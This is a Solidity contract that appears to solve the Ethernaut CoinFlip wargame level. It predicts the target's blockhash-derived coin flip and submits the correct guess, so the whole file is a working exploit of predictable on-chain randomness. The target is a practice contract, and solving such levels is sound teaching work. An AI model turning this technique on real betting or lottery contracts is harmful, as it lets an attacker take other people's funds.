// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { CoinFlip } from "ethernaut/L2.coinflip.sol";

contract CoinFlipCracker {
  uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip public immutable coinFlip;

  constructor(CoinFlip coinFlip_) {
    coinFlip = coinFlip_;
  }

  function flip() external {
    coinFlip.flip(uint256(blockhash(block.number - 1)) / FACTOR == 1);
  }
}
